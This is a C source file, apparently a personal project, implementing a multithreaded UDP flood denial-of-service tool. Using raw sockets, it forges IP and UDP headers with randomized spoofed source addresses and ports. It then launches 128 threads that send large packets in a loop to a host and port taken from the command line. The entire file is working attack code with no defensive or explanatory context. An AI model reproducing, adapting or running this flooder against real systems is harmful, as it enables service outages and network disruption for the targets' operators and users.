/*************************************************************************
	> File Name: attack.c
	> Author: yuxintao
	> Mail: 1921056015@qq.com 
	> Created Time: 2022年03月09日 星期三 15时12分08秒
 ************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <time.h>
#include <string.h>
#include <pthread.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
static inline unsigned int myrandom(int begin, int end);
static unsigned short Dos_cksum(unsigned short* data, int length);
static void Dos_udp();
static void* Dos_fun(void *argv);
#define MAXCHILD 128

static int alive;
static unsigned short dest_port;
static unsigned int dest;
static int rawsock;
static int PROTO_UDP;

static inline unsigned int myrandom(int begin, int end) {
	int gap = end - begin + 1;
	int ret = 0;
	srand((unsigned)time(NULL));
	ret = random() % gap + begin;
	return ret;
}

static unsigned short Dos_cksum(unsigned short* data, int length) {
	register int left = length;
	register unsigned short* word = data;
	register int sum = 0;
	unsigned short ret = 0;
	while (left > 1) {
		sum += *word;
		word++;
		left -= 2;
	}
	if (left == 1) {
		*(unsigned char*)(&ret) = *(unsigned char*)word;
		sum += ret;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	ret = ~sum;
	return (ret);
}

static void Dos_udp() {
	#define K 1204
	//data length
	#define DATUML (3 * K)

	int tot_len = sizeof(struct ip) + sizeof(struct udphdr) + DATUML;
	struct sockaddr_in to;

	struct dosseg_t{
		struct ip iph;
		struct udphdr udph;
		unsigned char data[65535];
	}dosseg;

	dosseg.iph.ip_v = 4;
	dosseg.iph.ip_hl = 5;
	dosseg.iph.ip_tos = 0;
	dosseg.iph.ip_len = htons(tot_len);
	dosseg.iph.ip_id = htons(getpid());
	dosseg.iph.ip_off = 0;
	dosseg.iph.ip_ttl = (unsigned char)myrandom(200, 255);
	dosseg.iph.ip_p = PROTO_UDP;
	dosseg.iph.ip_sum = 0;
	dosseg.iph.ip_src.s_addr = myrandom(0, 65535);
	dosseg.iph.ip_dst.s_addr = dest;
	dosseg.iph.ip_sum = Dos_cksum((unsigned short*)&dosseg.iph, sizeof(dosseg.iph));

#ifdef __FAVOR_BSD
	dosseg.udph.uh_sport = (unsigned short)myrandom(0, 65535);
	dosseg.udph.uh_dport = htons(dest_port);
	dosseg.udph.uh_ulen = htons(sizeof(dosseg.udph) + DATUML);
	dosseg.udph.uh_sum = 0;

	dosseg.udph.uh_sum = Dos_cksum((unsigned short*)&dosseg.udph, tot_len);
#else
	dosseg.udph.source = (unsigned short)myrandom(0, 65535);
	dosseg.udph.dest = htons(dest_port);
	dosseg.udph.len = htons(sizeof(dosseg.udph) + DATUML);
	dosseg.udph.check = 0;

	dosseg.udph.check = Dos_cksum((unsigned short*)&dosseg.udph, tot_len);
	
#endif
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(0);

	sendto(rawsock, &dosseg, tot_len, 0, (struct sockaddr*)&to, sizeof(struct sockaddr));
}

static void* Dos_fun(void *argv) {
	while (alive) {
		Dos_udp();
	}
}

static void Dos_sig(int sign) {
	alive = 0;
}

int main(int argc, char** argv) {
	if (argc < 3)
		return -1;
	//set data
	dest = inet_addr(argv[1]);
	if (dest == INADDR_NONE) {
		struct hostent* host = NULL;
		host = gethostbyname(argv[1]);
		if (host == NULL) {
			perror("gethostbyname");
			return -1;
		}
		memcpy((char*)&dest, host->h_addr, host->h_length);
	}
	dest_port = atoi(argv[2]);
	alive = 1;
	signal(SIGINT, Dos_sig);

	//get udp protocol
	struct protoent *protocol = NULL;
	char protoname[] = "udp";
	protocol = getprotobyname(protoname);
	if (protocol == NULL) {
		perror("getprotobyname");
		return -1;
	}
	PROTO_UDP = protocol->p_proto;
	//create socket
	rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (rawsock < 0) {
		rawsock = socket(AF_INET,SOCK_RAW, PROTO_UDP);
	}
	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));

	//start thread
	int i;
	pthread_t pthread[MAXCHILD];
	for (i = 0; i < MAXCHILD; ++i)
		pthread_create(&pthread[i], NULL, Dos_fun, NULL);
	for (i = 0; i < MAXCHILD; ++i)
		pthread_join(pthread[i], NULL);

	//close socket
	close(rawsock);
	return 0;
}


